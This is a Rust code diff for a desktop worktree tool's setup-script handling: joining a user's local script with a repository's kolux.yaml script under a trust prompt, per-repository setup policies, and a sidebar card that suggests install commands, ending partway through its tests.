@@ -154,11 +154,88 @@ fn configured_shell() -> Option<PathBuf> {
 /// STAT-055: where a project's setup script comes from. By default the script kept in Kolux's
 /// own settings for the repository wins even when kolux.yaml has one; the older shared-first
 /// policy (`shared`) takes kolux.yaml's only. The bool says whether the script is the shared one.
-pub fn pick_setup(local: Option<&str>, shared: Option<String>, policy: Option<&str>) -> Option<(String, bool)> {
+/// Tests only: under `both` the script is the joined text, which trust must never be asked over
+/// (use pick_parts, whose `shared` is the text to trust).
+#[cfg(test)]
+fn pick_setup(local: Option<&str>, shared: Option<String>, policy: Option<&str>) -> Option<(String, bool)> {
+    pick_parts(local, shared, policy).map(|p| {
+        let is_shared = p.shared.is_some();
+        (p.script, is_shared)
+    })
+}
+
+/// SET-033: the script that runs and, when it holds the repository's shared kolux.yaml script, that
+/// script's own text. SAFE-025 trust is asked and remembered over `shared` alone, never over the
+/// user's own text joined to it.
+#[derive(Debug, PartialEq, Clone)]
+pub struct Picked {
+    pub script: String,
+    pub shared: Option<String>,
+    /// Why the two scripts could not be joined (`both`); nothing runs then and `script` is empty.
+    pub refused: Option<String>,
+}
+
+/// SET-033: the own script and the shared one as one script that runs the first, then the second.
+/// Two plain one-line commands join with `&&` (cmd runs that too, and a failed first stops the
+/// second) when neither holds a `#` and the own one does not start with whitespace: on one line a
+/// POSIX shell would read everything after a `#` as a comment, and kolux.yaml's part would silently
+/// not run. Anything else joins by lines, for a POSIX shell, and a failed first part ends the script
+/// before the second runs. The two must agree on the interpreter: the same `#!` line, or one `#!`
+/// line beside a script that names none, and that line must name a POSIX shell, since a setup
+/// script runs through a shell (or cmd), never through node or python. Otherwise the join is
+/// refused with the reason.
+fn join_both(local: &str, shared: &str) -> Result<String, String> {
+    let (local, shared) = (local.trim_end_matches('\n'), shared.trim_end_matches('\n'));
+    let plain = |s: &str| !s.contains('\n') && !s.contains('#');
+    if plain(local) && plain(shared) && !local.starts_with(char::is_whitespace) {
+        return Ok(format!("{} && {}", local.trim(), shared.trim()));
+    }
+    fn hashbang(s: &str) -> Option<&str> {
+        s.lines().next().map(str::trim).filter(|l| l.starts_with("#!"))
+    }
+    let (own_line, shared_line) = (hashbang(local), hashbang(shared));
+    let pick_one = "Pick just one of them on this page.";
+    let not_posix = |l: &str| hashbang(l).is_some() && shebang(l.trim_start()).is_none();
+    match (own_line, shared_line) {
+        (Some(a), Some(b)) if a != b => return Err(format!("Your setup script starts with `{a}` and kolux.yaml's with `{b}`, so one script cannot run both. Give them the same #! line, or pick just one of them on this page.")),
+        (Some(a), Some(_)) if not_posix(local) => return Err(format!("Both setup scripts start with `{a}`, which is not a POSIX shell, so Kolux cannot run them as one script. {pick_one}")),
+        (Some(a), None) if not_posix(local) => return Err(format!("Your setup script starts with `{a}`, which is not a POSIX shell, so one script cannot run it and kolux.yaml's setup script together. {pick_one}")),
+        (None, Some(b)) if not_posix(shared) => return Err(format!("kolux.yaml's setup script starts with `{b}`, which is not a POSIX shell, so one script cannot run it and your setup script together. {pick_one}")),
+        _ => {}
+    }
+    let body = |s: &str, line: Option<&str>| if line.is_some() { s.split_once('\n').map_or("", |(_, rest)| rest).to_string() } else { s.to_string() };
+    let (own, theirs) = (body(local, own_line), body(shared, shared_line));
+    let head = own_line.or(shared_line).map(|l| format!("{l}\n")).unwrap_or_default();
+    Ok(format!("{head}{}\nkolux_setup_status=$?\n[ \"$kolux_setup_status\" -eq 0 ] || exit \"$kolux_setup_status\"\n{theirs}", own.trim_end_matches('\n')))
+}
+
+/// SET-033: why `both` could not run `local` then `shared` on this PC, if it could not: the two
+/// cannot be joined, or the joined script would go through cmd, which misreads it.
+fn both_trouble(local: &str, shared: &str, windows: bool, configured: Option<&Path>, find: impl Fn(&str) -> Option<PathBuf>) -> Option<String> {
+    let joined = match join_both(local, shared) {
+        Ok(j) => j,
+        Err(why) => return Some(why),
+    };
+    setup_line(&joined, windows, configured, find).err()
+}
+
+/// SET-033: pick_setup, plus the policy `both`, which runs the user's own setup and then the shared
+/// one when both exist (the one that exists, when only one does).
+pub fn pick_parts(local: Option<&str>, shared: Option<String>, policy: Option<&str>) -> Option<Picked> {
     let local = local.map(|l| l.replace("\r\n", "\n")).filter(|l| !l.trim().is_empty());
+    let own = |l: String| Picked { script: l, shared: None, refused: None };
+    let theirs = |s: String| Picked { script: s.clone(), shared: Some(s), refused: None };
     match policy {
-        Some("shared") | Some("shared-first") => shared.map(|s| (s, true)),
-        _ => local.map(|l| (l, false)).or_else(|| shared.map(|s| (s, true))),
+        Some("shared") | Some("shared-first") => shared.map(theirs),
+        Some("both") => match (local, shared) {
+            (Some(l), Some(s)) => Some(match join_both(&l, &s.replace("\r\n", "\n")) {
+                Ok(script) => Picked { script, shared: Some(s), refused: None },
+                Err(why) => Picked { script: String::new(), shared: None, refused: Some(why) },
+            }),
+            (Some(l), None) => Some(own(l)),
+            (None, s) => s.map(theirs),
+        },
+        _ => local.map(own).or_else(|| shared.map(theirs)),
     }
 }
 
@@ -224,18 +301,30 @@ pub fn with_env(mut line: SetupLine, vars: &[(&str, String)], unset: &[&str]) ->
 /// SAFE-025: a shared kolux.yaml script runs only once its repository trusts it.
 #[tauri::command(async)]
 pub fn workspace_setup(store: StoreState<'_>, path: String, local: Option<String>, policy: Option<String>) -> Result<Option<SetupLine>, String> {
+    let (local, policy) = setup_inputs(&store, &path, local, policy);
     setup_for(&path, local, policy, &|root, kind, script| require_trust(&store, root, kind, script))
 }
 
 /// STAT-055: workspace_setup's line, with `trust` asked before a shared script is used.
 fn setup_for(path: &str, local: Option<String>, policy: Option<String>, trust: Gate<'_>) -> Result<Option<SetupLine>, String> {
+    setup_for_on(path, local, policy, trust, cfg!(windows), configured_shell().as_deref(), find_posix)
+}
+
+/// setup_for on the platform given: `windows`, the `configured` shell and the POSIX shell finder.
+fn setup_for_on(path: &str, local: Option<String>, policy: Option<String>, trust: Gate<'_>, windows: bool, configured: Option<&Path>, find: impl Fn(&str) -> Option<PathBuf>) -> Result<Option<SetupLine>, String> {
     let wt = Path::new(path);
     let shared = std::fs::read_to_string(wt.join(crate::include::CONFIG_FILE)).ok().and_then(|t| setup_script(&t));
-    let Some((script, is_shared)) = pick_setup(local.as_deref(), shared, policy.as_deref()) else { return Ok(None) };
-    if is_shared {
-        trust(&main_folder(wt), "setup", &script)?;
+    let Some(Picked { script, shared, refused }) = pick_parts(local.as_deref(), shared, policy.as_deref()) else { return Ok(None) };
+    // SET-033: two scripts that cannot share an interpreter run nothing, and nothing is asked about trust
+    if let Some(why) = refused {
+        return Err(why);
     }
-    let line = setup_line(&script, cfg!(windows), configured_shell().as_deref(), find_posix)?;
+    // FIX-2: the same for a script this PC cannot run (a join cmd would misread, a #! shell it lacks):
+    // the line is built, and refused, before the question
+    let line = setup_line(&script, windows, configured, find)?;
+    if let Some(theirs) = shared {
+        trust(&main_folder(wt), "setup", &theirs)?;
+    }
     let unset: &[&str] = if conda_now() { &CONDA_VARS } else { &[] };
     Ok(Some(with_env(line, &script_vars(&main_folder(wt), wt), unset)))
 }
@@ -430,9 +519,17 @@ fn require_trust(store: &std::sync::Mutex<crate::state::Store>, root: &Path, kin
 /// SAFE-025: the shared kolux.yaml script of `kind` that would run for the worktree at `wt` of the
 /// repository at `root`; None when the one that would run is the user's own, or there is none.
 fn shared_script(kind: &str, root: &Path, wt: &Path, local: Option<&str>, policy: Option<&str>) -> Option<String> {
+    shared_script_on(kind, root, wt, local, policy, cfg!(windows), configured_shell().as_deref(), find_posix)
+}
+
+/// shared_script on the platform given (see setup_for_on).
+#[allow(clippy::too_many_arguments)]
+fn shared_script_on(kind: &str, root: &Path, wt: &Path, local: Option<&str>, policy: Option<&str>, windows: bool, configured: Option<&Path>, find: impl Fn(&str) -> Option<PathBuf>) -> Option<String> {
     let yaml = || std::fs::read_to_string(wt.join(crate::include::CONFIG_FILE)).ok();
     match kind {
-        "setup" => pick_setup(local, yaml().and_then(|t| setup_script(&t)), policy).filter(|(_, s)| *s).map(|(s, _)| s),
+        // FIX-2: the question is asked only over a script that would run here; a refused join, a join
+        // cmd would misread or a #! shell this PC lacks runs nothing, so nothing is asked (setup_for_on agrees)
+        "setup" => pick_parts(local, yaml().and_then(|t| setup_script(&t)), policy).filter(|p| p.refused.is_none() && setup_line(&p.script, windows, configured, find).is_ok()).and_then(|p| p.shared),
         "archive" => yaml().and_then(|y| scripts_entry(&y, "archive")),
         "issue" => issue_command(root, wt).filter(|(_, s)| *s).map(|(c, _)| c),
         _ => None,
@@ -442,14 +539,12 @@ fn shared_script(kind: &str, root: &Path, wt: &Path, local: Option<&str>, policy
 /// SAFE-025 / STAT-056: what the trust prompt must ask before the `kind` script runs for the
 /// worktree at `path` (`root` is the repository's main folder for the issue command; `local` and
 /// `policy` as workspace_setup takes them); None when nothing shared would run or it is trusted.
-// ponytail: registered in lib.rs by the coordinator (hunk evidence/T-156-a-lib.patch); until then only the
-// tests call it, and an untrusted shared script fails closed in the runners.
-#[allow(dead_code)]
 #[tauri::command(async)]
 pub fn script_trust_needed(store: StoreState<'_>, path: String, kind: String, root: Option<String>, local: Option<String>, policy: Option<String>) -> Result<Option<TrustAsk>, String> {
     kind_ok(&kind)?;
     let wt = Path::new(&path);
     let root = root.map(PathBuf::from).unwrap_or_else(|| main_folder(wt));
+    let (local, policy) = setup_inputs(&store, &path, local, policy);
     // git runs (the issue override check) before the store is locked
     let Some(script) = shared_script(&kind, &root, wt, local.as_deref(), policy.as_deref()) else { return Ok(None) };
     let store = store.lock().map_err(|_| "Kolux could not check this repository's trust, so its kolux.yaml scripts do not run".to_string())?;
@@ -457,9 +552,6 @@ pub fn script_trust_needed(store: StoreState<'_>, path: String, kind: String, ro
 }
 
 /// SAFE-025: the user chose Run hooks on the prompt for `script` (the text it showed).
-// ponytail: registered in lib.rs by the coordinator (hunk evidence/T-156-a-lib.patch); until then only the
-// tests call it, and an untrusted shared script fails closed in the runners.
-#[allow(dead_code)]
 #[tauri::command(async)]
 pub fn script_trust_grant(store: StoreState<'_>, path: String, kind: String, script: String, always: bool, root: Option<String>) -> Result<(), String> {
     let root = root.map(PathBuf::from).unwrap_or_else(|| main_folder(Path::new(&path)));
@@ -688,6 +780,404 @@ pub fn setup_import(path: String, file: String) -> Result<(), String> {
     let yaml = std::fs::read_to_string(&target).unwrap_or_default();
     let next = import_into(&yaml, offer.setup.as_deref(), offer.teardown.as_deref())?;
     std::fs::write(&target, next).map_err(|e| format!("{} could not be written: {e}", crate::include::CONFIG_FILE))
+}
+
+// ---- PROJ-035: the sidebar card that suggests adding a setup script
+//
+// For a project with no setup script in effect, `suggest` says what to offer: the install command of
+// the package manager it declares, the setup another worktree tool's file holds (with the fields that
+// cannot come along), or an error when kolux.yaml cannot be read. Saving puts the script in Kolux's
+// own settings for the repository (the local setup `workspace_setup` already prefers), so the
+// suggestion ends by itself; dismissing is remembered per project.
+
+const LOCAL_KEY: &str = "localSetups";
+const DISMISSED_KEY: &str = "setupCardDismissed";
+const LOCAL_MAX: usize = 16 * 1024;
+/// The setup policy ("shared" and "shared-first" ignore a local setup) is one store setting, so the
+/// runner, the trust check and the sidebar card all work from the same answer.
+const POLICY_KEY: &str = "setupPolicy";
+/// package.json and kolux.yaml are read only up to this size by the card.
+const READ_MAX: u64 = 1024 * 1024;
+/// A field name from another tool's file is shown at most this long.
+const SHOWN_NAME_MAX: usize = 60;
+const MANAGERS: [&str; 4] = ["npm", "pnpm", "yarn", "bun"];
+
+#[derive(serde::Serialize, Debug, PartialEq, Clone)]
+#[serde(tag = "kind", rename_all = "camelCase")]
+pub enum SetupSuggestion {
+    None,
+    Install { command: String, manager: String },
+    Import { file: String, setup: String, skipped: Vec<String> },
+    Error { message: String },
+}
+
+/// The policy in force: the caller's, else the stored setting; blank is none.
+fn effective_policy(store: &crate::state::Store, asked: Option<String>) -> Option<String> {
+    asked.or_else(|| store.get(POLICY_KEY).ok().flatten()).map(|p| p.trim().to_string()).filter(|p| !p.is_empty())
+}
+
+/// The policy that applies to the repository at `root`: the caller's, else the repository's own
+/// choice (SET-033), else the stored global setting.
+fn policy_for(store: &crate::state::Store, asked: Option<String>, root: &Path) -> Option<String> {
+    effective_policy(store, asked.or_else(|| repo_policy(store, root)))
+}
+
+/// What the runner and the trust check both start from: the repository's local setup and the policy
+/// in force. A setup saved from the sidebar card is the repository's local setup (PROJ-035).
+fn setup_inputs(store: &StoreState<'_>, path: &str, local: Option<String>, policy: Option<String>) -> (Option<String>, Option<String>) {
+    match store.lock() {
+        Ok(s) => {
+            let root = main_folder(Path::new(path));
+            (local.or_else(|| local_setup(&s, &root)), policy_for(&s, policy, &root))
+        }
+        Err(_) => (local, policy),
+    }
+}
+
+/// A policy that takes only kolux.yaml's script: a local setup is never run under it.
+fn ignores_local(policy: Option<&str>) -> bool {
+    matches!(policy, Some("shared") | Some("shared-first"))
+}
+
+/// The local setup kept for the repository whose main folder is `root`.
+pub fn local_setup(store: &crate::state::Store, root: &Path) -> Option<String> {
+    let all: std::collections::BTreeMap<String, String> = store.get(LOCAL_KEY).ok().flatten().and_then(|v| serde_json::from_str(&v).ok()).unwrap_or_default();
+    all.get(&crate::projects::name_key(&root.to_string_lossy())).filter(|s| !s.trim().is_empty()).cloned()
+}
+
+fn save_local(store: &crate::state::Store, root: &Path, script: &str) -> Result<(), String> {
+    let script = script.replace("\r\n", "\n");
+    let script = script.trim_matches('\n');
+    if script.trim().is_empty() || script.len() > LOCAL_MAX {
+        return Err(format!("A setup script has to be between 1 character and {} KB.", LOCAL_MAX / 1024));
+    }
+    let mut all: std::collections::BTreeMap<String, String> = store.get(LOCAL_KEY).ok().flatten().and_then(|v| serde_json::from_str(&v).ok()).unwrap_or_default();
+    all.insert(crate::projects::name_key(&root.to_string_lossy()), script.to_string());
+    store.set(LOCAL_KEY, &serde_json::to_string(&all).map_err(|e| e.to_string())?).map_err(|e| e.to_string())
+}
+
+/// SET-033: a repository's own setup choices, kept per main folder like the local setups: which of
+/// the local and the shared script run (`setupPolicies`; absent inherits the `setupPolicy` setting)
+/// and whether the agent waits for setup to finish (`setupWaits`; absent means it does not).
+const POLICIES_KEY: &str = "setupPolicies";
+const WAITS_KEY: &str = "setupWaits";
+const REPO_POLICIES: [&str; 3] = ["local", "shared", "both"];
+
+fn repo_map<T: serde::de::DeserializeOwned>(store: &crate::state::Store, key: &str) -> std::collections::BTreeMap<String, T> {
+    store.get(key).ok().flatten().and_then(|v| serde_json::from_str(&v).ok()).unwrap_or_default()
+}
+
+fn put_repo_map<T: serde::Serialize>(store: &crate::state::Store, key: &str, map: &std::collections::BTreeMap<String, T>) -> Result<(), String> {
+    store.set(key, &serde_json::to_string(map).map_err(|e| e.to_string())?).map_err(|e| e.to_string())
+}
+
+/// The repository's own setup policy (`local`, `shared` or `both`); None when it inherits.
+pub fn repo_policy(store: &crate::state::Store, root: &Path) -> Option<String> {
+    repo_map::<String>(store, POLICIES_KEY).get(&crate::projects::name_key(&root.to_string_lossy())).filter(|p| REPO_POLICIES.contains(&p.as_str())).cloned()
+}
+
+/// Sets the repository's own policy; None goes back to inheriting. Anything but the three
+/// choices is refused, so a stray value can never change which script runs.
+pub fn set_repo_policy(store: &crate::state::Store, root: &Path, policy: Option<&str>) -> Result<(), String> {
+    let mut all = repo_map::<String>(store, POLICIES_KEY);
+    let key = crate::projects::name_key(&root.to_string_lossy());
+    match policy.map(str::trim).filter(|p| !p.is_empty()) {
+        None => all.remove(&key),
+        Some(p) if REPO_POLICIES.contains(&p) => all.insert(key, p.to_string()),
+        Some(p) => return Err(format!("{p} is not a setup choice: pick local, shared or both.")),
+    };
+    put_repo_map(store, POLICIES_KEY, &all)
+}
+
+/// Whether the agent waits for this repository's setup to finish (new workspaces start from it).
+pub fn repo_wait(store: &crate::state::Store, root: &Path) -> bool {
+    repo_map::<bool>(store, WAITS_KEY).get(&crate::projects::name_key(&root.to_string_lossy())).copied().unwrap_or(false)
+}
+
+pub fn set_repo_wait(store: &crate::state::Store, root: &Path, wait: bool) -> Result<(), String> {
+    let mut all = repo_map::<bool>(store, WAITS_KEY);
+    let key = crate::projects::name_key(&root.to_string_lossy());
+    if wait {
+        all.insert(key, true);
+    } else {
+        all.remove(&key);
+    }
+    put_repo_map(store, WAITS_KEY, &all)
+}
+
+/// PROJ-035 / SET-033: takes the repository's saved local setup away. Ok(false) when it had none.
+pub fn remove_local(store: &crate::state::Store, root: &Path) -> Result<bool, String> {
+    let mut all = repo_map::<String>(store, LOCAL_KEY);
+    if all.remove(&crate::projects::name_key(&root.to_string_lossy())).is_none() {
+        return Ok(false);
+    }
+    put_repo_map(store, LOCAL_KEY, &all).map(|_| true)
+}
+
+/// What the repository's setup section shows.
+#[derive(serde::Serialize, Debug, PartialEq, Clone)]
+#[serde(rename_all = "camelCase")]
+pub struct RepoSetup {
+    /// The script kept in Kolux for this repository.
+    pub local: Option<String>,
+    /// The script in the repository's kolux.yaml.
+    pub shared: Option<String>,
+    /// Why kolux.yaml could not be read, when it exists but cannot be.
+    pub shared_error: Option<String>,
+    /// The repository's own choice (`local`, `shared`, `both`); None while it inherits.
+    pub policy: Option<String>,
+    /// What it inherits: the global setting, `local` when none is set.
+    pub inherited: String,
+    pub wait: bool,
+    /// Both scripts exist and no choice is made: running both is suggested.
+    pub suggest_both: bool,
+    /// Why the choice in force would not run on this PC (the two scripts cannot be joined, or cmd
+    /// would misread the joined one); None when it runs or nothing is chosen to run.
+    pub run_error: Option<String>,
+}
+
+/// kolux.yaml's setup script at `root`, or why it could not be read (a missing file is no error).
+fn read_shared(root: &Path) -> (Option<String>, Option<String>) {
+    match read_capped(&root.join(crate::include::CONFIG_FILE), READ_MAX) {
+        Ok(t) => (setup_script(&t), None),
+        Err(e) if e.kind() == std::io::ErrorKind::NotFound => (None, None),
+        Err(e) => (None, Some(format!("{} could not be read: {e}", crate::include::CONFIG_FILE))),
+    }
+}
+
+pub fn repo_setup(store: &crate::state::Store, root: &Path, shared: (Option<String>, Option<String>)) -> RepoSetup {
+    repo_setup_on(store, root, shared, cfg!(windows), configured_shell().as_deref(), find_posix)
+}
+
+/// repo_setup on the platform given (see setup_for_on), so `run_error` can be checked anywhere.
+fn repo_setup_on(store: &crate::state::Store, root: &Path, shared: (Option<String>, Option<String>), windows: bool, configured: Option<&Path>, find: impl Fn(&str) -> Option<PathBuf>) -> RepoSetup {
+    let local = local_setup(store, root);
+    let policy = repo_policy(store, root);
+    let inherited = match effective_policy(store, None).as_deref() {
+        Some("shared") | Some("shared-first") => "shared",
+        Some("both") => "both",
+        _ => "local",
+    };
+    let suggest_both = policy.is_none() && inherited == "local" && local.is_some() && shared.0.is_some();
+    // SET-033: the page says when the choice in force is `both` and the joined script would be refused here
+    let in_force = policy.as_deref().unwrap_or(inherited);
+    let run_error = match (in_force, local.as_deref(), shared.0.as_deref()) {
+        ("both", Some(own), Some(theirs)) => both_trouble(own, theirs, windows, configured, find),
+        _ => None,
+    };
+    RepoSetup { local, shared: shared.0, shared_error: shared.1, policy, inherited: inherited.to_string(), wait: repo_wait(store, root), suggest_both, run_error }
+}
+
+#[tauri::command(async)]
+pub fn repo_setup_get(store: StoreState<'_>, path: String) -> Result<RepoSetup, String> {
+    let root = main_folder(Path::new(&path));
+    let shared = read_shared(&root);
+    let store = store.lock().map_err(|e| e.to_string())?;
+    Ok(repo_setup(&store, &root, shared))
+}
+
+/// Saves the repository's local setup. It is the user's own text, so it runs without the trust prompt.
+#[tauri::command]
+pub fn repo_setup_save(store: StoreState<'_>, path: String, script: String) -> Result<(), String> {
+    save_local(&*store.lock().map_err(|e| e.to_string())?, &main_folder(Path::new(&path)), &script)
+}
+
+#[tauri::command]
+pub fn repo_setup_remove(store: StoreState<'_>, path: String) -> Result<bool, String> {
+    remove_local(&*store.lock().map_err(|e| e.to_string())?, &main_folder(Path::new(&path)))
+}
+
+#[tauri::command]
+pub fn repo_setup_policy_set(store: StoreState<'_>, path: String, policy: Option<String>) -> Result<(), String> {
+    set_repo_policy(&*store.lock().map_err(|e| e.to_string())?, &main_folder(Path::new(&path)), policy.as_deref())
+}
+
+#[tauri::command]
+pub fn repo_setup_wait_set(store: StoreState<'_>, path: String, wait: bool) -> Result<(), String> {
+    set_repo_wait(&*store.lock().map_err(|e| e.to_string())?, &main_folder(Path::new(&path)), wait)
+}
+
+fn dismissed_ids(store: &crate::state::Store) -> Vec<String> {
+    store.get(DISMISSED_KEY).ok().flatten().and_then(|v| serde_json::from_str(&v).ok()).unwrap_or_default()
+}
+
+/// A forgotten project's card state goes with it: its dismissal (by id) and its saved local setup
+/// (by the folder it lived in).
+pub fn prune_setup(store: &crate::state::Store, ids: &[String], roots: &[String]) -> Result<(), String> {
+    let before = dismissed_ids(store);
+    let kept: Vec<String> = before.iter().filter(|i| !ids.contains(i)).cloned().collect();
+    if kept.len() != before.len() {
+        store.set(DISMISSED_KEY, &serde_json::to_string(&kept).map_err(|e| e.to_string())?).map_err(|e| e.to_string())?;
+    }
+    let mut all: std::collections::BTreeMap<String, String> = store.get(LOCAL_KEY).ok().flatten().and_then(|v| serde_json::from_str(&v).ok()).unwrap_or_default();
+    let count = all.len();
+    for r in roots {
+        all.remove(&crate::projects::name_key(r));
+    }
+    if all.len() != count {
+        store.set(LOCAL_KEY, &serde_json::to_string(&all).map_err(|e| e.to_string())?).map_err(|e| e.to_string())?;
+    }
+    // SET-033: its own policy and wait choice go with it
+    let keys: Vec<String> = roots.iter().map(|r| crate::projects::name_key(r)).collect();
+    let mut policies = repo_map::<String>(store, POLICIES_KEY);
+    let before = policies.len();
+    policies.retain(|k, _| !keys.contains(k));
+    if policies.len() != before {
+        put_repo_map(store, POLICIES_KEY, &policies)?;
+    }
+    let mut waits = repo_map::<bool>(store, WAITS_KEY);
+    let before = waits.len();
+    waits.retain(|k, _| !keys.contains(k));
+    if waits.len() != before {
+        put_repo_map(store, WAITS_KEY, &waits)?;
+    }
+    Ok(())
+}
+
+pub fn card_dismissed(store: &crate::state::Store, project_id: &str) -> bool {
+    dismissed_ids(store).iter().any(|i| i == project_id)
+}
+
+pub fn dismiss_card(store: &crate::state::Store, project_id: &str) -> Result<(), String> {
+    let mut ids = dismissed_ids(store);
+    if !ids.iter().any(|i| i == project_id) {
+        ids.push(project_id.to_string());
+        store.set(DISMISSED_KEY, &serde_json::to_string(&ids).map_err(|e| e.to_string())?).map_err(|e| e.to_string())?;
+    }
+    Ok(())
+}
+
+/// A file's text, refused past `max` bytes so an untrusted repository cannot make the card read
+/// without bound.
+fn read_capped(path: &Path, max: u64) -> std::io::Result<String> {
+    use std::io::Read;
+    let mut text = String::new();
+    let n = std::fs::File::open(path)?.take(max + 1).read_to_string(&mut text)?;
+    if n as u64 > max {
+        return Err(std::io::Error::new(std::io::ErrorKind::InvalidData, format!("it is larger than {} KB", max / 1024)));
+    }
+    Ok(text)
+}
+
+/// A field name from an untrusted file, cut to SHOWN_NAME_MAX characters (an ellipsis marks the cut).
+fn shown_name(name: &str) -> String {
+    if name.chars().count() <= SHOWN_NAME_MAX {
+        return name.to_string();
+    }
+    let mut cut: String = name.chars().take(SHOWN_NAME_MAX - 1).collect();
+    cut.push('…');
+    cut
+}
+
+/// The install command of the package manager the project declares: `packageManager` in
+/// package.json, else the lock file it keeps. Nothing declared, nothing guessed.
+fn install_command(root: &Path) -> Option<(String, String)> {
+    let text = read_capped(&root.join("package.json"), READ_MAX).ok()?;
+    let v: serde_json::Value = serde_json::from_str(&text).unwrap_or_default(); // unreadable JSON declares nothing; the lock file may still say
+    let declared = v["packageManager"].as_str().and_then(|s| s.split('@').next()).filter(|m| MANAGERS.contains(m)).map(str::to_string);
+    let locked = || {
+        [("pnpm-lock.yaml", "pnpm"), ("yarn.lock", "yarn"), ("bun.lock", "bun"), ("bun.lockb", "bun"), ("package-lock.json", "npm")].into_iter().find(|(f, _)| root.join(f).is_file()).map(|(_, m)| m.to_string())
+    };
+    let manager = declared.or_else(locked)?;
+    Some((format!("{manager} install"), manager))
+}
+
+/// What another tool's file holds that a local setup cannot take: every field beyond the setup
+/// command, named as it is in the file.
+fn skipped_fields(file: &str, text: &str, has_teardown: bool) -> Vec<String> {
+    let mut out = Vec::new();
+    if file.ends_with(".json") {
+        if let Some(obj) = serde_json::from_str::<serde_json::Value>(text).ok().and_then(|v| v.as_object().cloned()) {
+            for (k, val) in &obj {
+                match (k.as_str(), val.as_object()) {
+                    ("scripts", Some(s)) => out.extend(s.keys().filter(|n| *n != "setup" && *n != "archive").map(|n| format!("scripts.{n}"))),
+                    _ => out.push(k.clone()),
+                }
+            }
+        }
+    } else if let Ok(doc) = text.parse::<toml_edit::DocumentMut>() {
+        for (k, item) in doc.iter() {
+            match (k, item.as_table_like()) {
+                ("setup" | "cleanup", Some(t)) => out.extend(t.iter().filter(|(n, _)| *n != "script").map(|(n, _)| format!("{k}.{n}"))),
+                ("setup" | "cleanup", None) => {}
+                _ => out.push(k.to_string()),
+            }
+        }
+    }
+    let mut out: Vec<String> = out.iter().map(|n| shown_name(n)).collect();
+    if has_teardown {
+        out.push("teardown (a local setup has no archive script)".to_string());
+    }
+    out.truncate(20);
+    out
+}
+
+/// What the sidebar card offers for the repository at `root`: nothing when a setup script is already
+/// in effect (`local` is the one kept in Kolux's settings), else an import, else an install command.
+pub fn suggest(root: &Path, local: Option<&str>, policy: Option<&str>) -> SetupSuggestion {
+    let shared = match read_capped(&root.join(crate::include::CONFIG_FILE), READ_MAX) {
+        Ok(t) => setup_script(&t),
+        Err(e) if e.kind() == std::io::ErrorKind::NotFound => None,
+        Err(e) => return SetupSuggestion::Error { message: format!("{} could not be read: {e}", crate::include::CONFIG_FILE) },
+    };
+    if pick_parts(local, shared, policy).is_some() {
+        return SetupSuggestion::None;
+    }
+    // Under a policy that takes only kolux.yaml's script a saved local setup would never run: no card.
+    if ignores_local(policy) {
+        return SetupSuggestion::None;
+    }
+    if let Some(o) = setup_imports(root).into_iter().find(|o| o.refused.is_none() && o.setup.is_some()) {
+        let text = read_capped(&root.join(&o.file), IMPORT_MAX).unwrap_or_default();
+        let skipped = skipped_fields(&o.file, text.trim_start_matches('\u{feff}'), o.teardown.is_some());
+        return SetupSuggestion::Import { file: o.file, setup: o.setup.unwrap_or_default(), skipped };
+    }
+    install_command(root).map_or(SetupSuggestion::None, |(command, manager)| SetupSuggestion::Install { command, manager })
+}
+
+/// Saves what the card offers (`from` is "install" or the import's file name) as the repository's
+/// local setup. The offer is worked out again here, so only what the project really offers is kept,
+/// and `shown` (the script the card displayed) has to be exactly what it is now: a file that changed
+/// since the card was drawn is refused, since a local setup runs without the trust prompt.
+pub fn save_suggestion(store: &crate::state::Store, root: &Path, from: &str, shown: &str, policy: Option<&str>) -> Result<(), String> {
+    let script = match suggest(root, local_setup(store, root).as_deref(), policy) {
+        SetupSuggestion::Install { command, .. } if from == "install" => command,
+        SetupSuggestion::Import { file, setup, .. } if file == from => setup,
+        SetupSuggestion::Error { message } => return Err(message),
+        _ => return Err("That suggestion is no longer offered.".to_string()),
+    };
+    if script != shown {
+        return Err("That suggestion changed since it was shown. Look at the card again before saving.".to_string());
+    }
+    save_local(store, root, &script)
+}
+
+/// PROJ-035: what the sidebar card should offer for the project at `path`, re-asked when the window
+/// is focused or another workspace is made active. A dismissed project gets nothing.
+#[tauri::command(async)]
+pub fn setup_suggestion(store: StoreState<'_>, project_id: String, path: String, policy: Option<String>) -> Result<SetupSuggestion, String> {
+    let root = main_folder(Path::new(&path));
+    let (local, policy) = {
+        let s = store.lock().map_err(|e| e.to_string())?;
+        if card_dismissed(&s, &project_id) {
+            return Ok(SetupSuggestion::None);
+        }
+        (local_setup(&s, &root), policy_for(&s, policy, &root))
+    };
+    Ok(suggest(&root, local.as_deref(), policy.as_deref()))
+}
+
+#[tauri::command(async)]
+pub fn setup_suggestion_save(store: StoreState<'_>, path: String, from: String, shown: String, policy: Option<String>) -> Result<(), String> {
+    let store = store.lock().map_err(|e| e.to_string())?;
+    let root = main_folder(Path::new(&path));
+    let policy = policy_for(&store, policy, &root);
+    save_suggestion(&store, &root, &from, &shown, policy.as_deref())
+}
+
+#[tauri::command]
+pub fn setup_suggestion_dismiss(store: StoreState<'_>, project_id: String) -> Result<(), String> {
+    dismiss_card(&*store.lock().map_err(|e| e.to_string())?, &project_id)
 }
 
 #[cfg(test)]
@@ -1118,5 +1608,526 @@ mod tests {
         assert_eq!(shared_script("issue", &root, &root, None, None).as_deref(), Some("work {{issue}}"));
         assert_eq!(shared_script("vm", &root, &root, None, None), None);
         let _ = std::fs::remove_dir_all(root);
+    }
+
+    #[test]
+    fn proj035_nothing_is_offered_while_a_setup_script_is_in_effect() {
+        let pkg: &[u8] = br#"{"packageManager":"pnpm@9.1.0"}"#;
+        let shared = tree(&[("package.json", pkg), ("kolux.yaml", b"scripts:\n  setup: make\n")]);
+        assert_eq!(suggest(&shared, None, None), SetupSuggestion::None, "kolux.yaml has one");
+        let bare = tree(&[("package.json", pkg)]);
+        assert_eq!(suggest(&bare, Some("make"), None), SetupSuggestion::None, "a local one is kept");
+        assert_eq!(suggest(&tree(&[("README.md", b"x")]), None, None), SetupSuggestion::None, "nothing to suggest");
+        for d in [shared, bare] {
+            let _ = std::fs::remove_dir_all(d);
+        }
+    }
+
+    #[test]
+    fn proj035_the_install_command_is_the_declared_package_managers() {
+        let ask = |files: &[(&str, &[u8])]| {
+            let d = tree(files);
+            let s = suggest(&d, None, None);
+            let _ = std::fs::remove_dir_all(d);
+            s
+        };
+        let install = |c: &str, m: &str| SetupSuggestion::Install { command: c.into(), manager: m.into() };
+        assert_eq!(ask(&[("package.json", br#"{"packageManager":"pnpm@9.1.0"}"#)]), install("pnpm install", "pnpm"));
